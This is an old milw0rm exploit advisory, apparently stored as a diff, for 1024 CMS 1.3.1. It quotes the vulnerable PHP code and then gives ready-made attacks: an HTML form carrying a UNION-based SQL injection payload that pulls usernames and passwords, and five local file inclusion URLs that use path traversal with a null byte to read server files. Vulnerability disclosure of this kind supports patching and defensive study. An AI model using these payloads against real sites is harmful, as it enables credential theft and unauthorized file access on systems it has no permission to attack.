@@ -1,0 +1,59 @@
+  vuln.: 1024 CMS 1.3.1 (LFI/SQL) Multiple Vulnerabilities
+  script info and download: http://www.1024cms.com
+
+  author: irk4z[at]yahoo.pl
+  greets to: str0ke, wacky
+'-----------------------------------------------------------------------------'
+
+
+# sql-injection:
+
+ code:
+
+   /admin/ops/findip/ajax/search.php:
+   ...
+ 8     $get_users = mysql_query("SELECT id, username FROM ".$prefix."users WHERE ip='".$_POST['ip']."'") or die("cannot get ips: ".mysql_error());
+   ...
+   
+   ^ if magic_quotes_gpc==off, we can get all usernames and passwords from database ;]
+
+ exploit:
+ 
+  <form method="POST" action="http://[host]/[path]/admin/ops/findip/ajax/search.php">
+   <input style="width:600px" type="text" name="ip" value="z' AND 1=2 UNION SELECT 1,concat(username,0x20,password) FROM otatf_users/*" />
+   <input type="submit" value="ok" />
+  </form>
+
+
+# local file inclusion:
+
+ code:
+
+   /admin/ops/reports/ops/download.php, /admin/ops/reports/ops/forum.php, /admin/ops/reports/ops/news.php:
+   ...
+ 1     <?php
+ 2     include("./themes/".$admin_theme_dir."/templates/default_header.tpl");
+   ...
+ 
+   /pages/print/default/ops/news.php:
+   ...
+ 5     if(!isset($_GET['id']) || !is_numeric($_GET['id'])) die("ID Not Set");
+ 6     include("./lang/".$lang."/news/default.php");
+   ...
+
+   /pages/download/default/ops/search.php:
+   ...
+ 1     <?php
+ 2     include("./themes/".$theme_dir."/templates/default_header.tpl");
+   ...
+
+
+ exploits:
+
+   http://[site]/[path]/admin/ops/reports/ops/download.php?admin_theme_dir=../../../../../../../../../boot.ini%00
+   http://[site]/[path]/admin/ops/reports/ops/forum.php?admin_theme_dir=../../../../../../../../../boot.ini%00
+   http://[site]/[path]/admin/ops/reports/ops/news.php?admin_theme_dir=../../../../../../../../../boot.ini%00
+   http://[site]/[path]/pages/print/default/ops/news.php?id=1&lang=../../../../../../../../../boot.ini%00
+   http://[site]/[path]/pages/download/default/ops/search.php?theme_dir=../../../../../../../../../boot.ini%00
+
+# milw0rm.com [2007-12-21]
